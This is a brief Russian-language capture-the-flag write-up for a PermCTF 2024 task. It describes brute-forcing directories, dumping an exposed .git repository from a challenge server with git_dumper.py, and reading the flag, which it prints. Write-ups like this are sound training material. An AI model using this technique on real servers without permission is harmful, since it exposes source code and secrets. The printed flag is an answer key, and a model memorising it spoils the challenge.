# Дамплинги, Морти!
## Описание
![Описание задания](https://raw.githubusercontent.com/EogoK/permctf2024_writeup/refs/heads/main/photos/morty.jpg)


## Решение 

1. Брут директорий по словарю wordlist

2. 
```
git_dumper.py:
python3 git_dumper.py http://84.201.168.221:8080/.git /tmp/webs

[-] Already downloaded http://84.201.168.221:8080/.git/COMMIT_EDITMSG
```

3. Переходим по пути в файл

## Ресурсы

https://github.com/arthaud/git-dumper/

## Флаг
PermCTF{60j2qn017e4e}